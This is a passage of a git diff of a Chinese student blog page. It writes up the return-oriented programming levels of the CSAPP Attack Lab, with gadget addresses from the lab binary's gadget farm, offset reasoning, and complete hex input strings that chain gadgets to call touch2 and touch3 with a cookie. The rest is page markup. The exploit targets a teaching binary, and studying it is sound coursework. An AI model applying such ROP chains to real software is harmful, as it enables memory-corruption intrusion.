+00 00 00 00 00 00 00 00
+23 1f 40 00 00 00 00 00  &lt;----- popq %rax
+ac 93 bf 36 00 00 00 00  &lt;----- coookie
+19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi
+29 1d 40 00 00 00 00 00  &lt;----- touch2 的起始地址
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="level-3-1">Level 3</h3>
+<p>需要做的是重复 <code>Code Injection Attacks</code> 中第三阶段的任务,
+把 <code>cookie</code> 字符串的起始地址传送到 <code>%rdi</code>,
+然后调用 <code>touch3</code>. 但是无法再将指令序列放入到栈中,
+而是需要在程序的 <code>gadget farm</code> 中找到需要的指令序列.</p>
+<p>因为程序使用栈随机化增强安全性能, 只能用栈顶地址 + 偏移量来索引
+<code>cookie</code> 字符串的起始地址.</p>
+<p>注意到 <code>farm</code> 中已经存在了一个 <code>add_xy</code> 函数,
+可以考虑将 <code>%rsp</code> 传入 <code>%rdi</code>, 将偏移量传入
+<code>%rsi</code>, 进而计算出 <code>cookie</code> 字符串的首地址,
+并传送到 <code>%rax</code>.</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401f5b &lt;add_xy&gt;:
+  401f5b:	f3 0f 1e fa          	endbr64 
+  401f5f:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax
+  401f63:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>将 <code>%rsp</code> 传入 <code>%rdi</code> 需要的代码为:</li>
+</ul>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">movq %rsp, %rax
+movq %rax, %rdi
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<ul>
+<li>将偏移量传入 <code>%rsi</code> 需要的代码为:</li>
+</ul>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">popq %rax
+movq %eax, %ecx
+movq %ecx, %edx
+movq %edx, %esi
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>最困难的一条指令、也是唯一没有使用 <code>c3</code> 或 <code>90</code>
+结尾的 <code>gadget</code> 指令为: 从 <code>%ecx</code> 传入
+<code>%esi</code>.</p>
+<p>这一步的指令字节为 <code>89 ca</code>, 而 <code>08 db</code>
+为一个<code>nop</code> 指令 <code>orb %bl %bl</code> 的编码, 因此
+<code>0x401fe9</code>是一个符合要求的 <code>gadget</code> 地址.</p>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">0000000000401fe3 &lt;setval_370&gt;:
+  401fe3:	f3 0f 1e fa          	endbr64 
+  401fe7:	c7 07 89 ca 08 db    	movl   $0xdb08ca89,(%rdi)
+  401fed:	c3                   	retq   
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<ul>
+<li>计算 <code>cookie</code> 地址, 传入 <code>%rdi</code>
+需要的代码为:</li>
+</ul>
+<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">lea  (%rdi,%rsi,1),%rax
+movq %rax, %rdi
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>获取 <code>%rsp</code> 的指令与 <code>cookie</code>
+字符串的存储地址间隔了九条 <code>8</code> 字节指令, 因此偏移量为
+<code>0x48</code>.</p>
+<figure>
+<img src="/pic/40.png" alt="栈帧结构">
+<figcaption aria-hidden="true">栈帧结构</figcaption>
+</figure>
+<p>下面构建输入字符串:</p>
+<pre class="line-numbers language-none"><code class="language-none">00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+d3 1f 40 00 00 00 00 00  &lt;----- movq %rsp, %rax
+19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi
+23 1f 40 00 00 00 00 00  &lt;----- popq %rax
+48 00 00 00 00 00 00 00  &lt;----- cookie 字符串偏移量
+3f 20 40 00 00 00 00 00  &lt;----- movq %eax, %ecx
+e9 1f 40 00 00 00 00 00  &lt;----- movq %ecx, %edx
+a9 20 40 00 00 00 00 00  &lt;----- movq %edx, %esi
+5b 1f 40 00 00 00 00 00  &lt;----- lea  (%rdi,%rsi,1),%rax
+19 1f 40 00 00 00 00 00  &lt;----- movq %rax, %rdi
+4e 1e 40 00 00 00 00 00  &lt;----- touch3 的起始地址
+33 36 62 66 39 33 61 63
+00                       &lt;----- cookie 字符串
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
                 
             </div>
@@ -483,7 +812,7 @@ long}\)</span> 数组来存储坐标与相应乘积;
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://chengsx21.github.io/11/">http://chengsx21.github.io/11/</a>
+                    <a href="http://chengsx21.github.io/31/">http://chengsx21.github.io/31/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -521,8 +850,8 @@ long}\)</span> 数组来存储坐标与相应乘积;
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/DSA/">
-                                    <span class="chip bg-color">DSA</span>
+                                <a href="/tags/CSAPP/">
+                                    <span class="chip bg-color">CSAPP</span>
                                 </a>
                             
                         </div>
@@ -600,7 +929,7 @@ long}\)</span> 数组来存储坐标与相应乘积;
         repo: 'chengsx21.github.io',
         owner: 'chengsx21',
         admin: "chengsx21",
-        id: '2022-09-30T10-15-16',
+        id: '2022-11-25T20-53-32',
         distractionFreeMode: false  // Facebook-like distraction free mode
     });
 
@@ -628,28 +957,29 @@ long}\)</span> 数组来存储坐标与相应乘积;
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/12/">
+                <a href="/31/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="计算机系统概论 作业1">
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="计算机系统概论 Lab2">
                         
-                        <span class="card-title">计算机系统概论 作业1</span>
+                        <span class="card-title">计算机系统概论 Lab2</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            CSAPP Hw1
+                            CSAPP Lab1
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-10-03
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-25
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -666,6 +996,7 @@ long}\)</span> 数组来存储坐标与相应乘积;
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -684,23 +1015,23 @@ long}\)</span> 数组来存储坐标与相应乘积;
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/10/">
+                <a href="/30/">
                     <div class="card-image">
                         
-                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="A+B Problem">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="Nearest Neighbour">
                         
-                        <span class="card-title">A+B Problem</span>
+                        <span class="card-title">Nearest Neighbour</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            DSA CST 1-1 解题报告
+                            DSA CST 3-6 解题报告
                         
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-09-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2022-11-23
                             </span>
                         <span class="publish-author">
                             
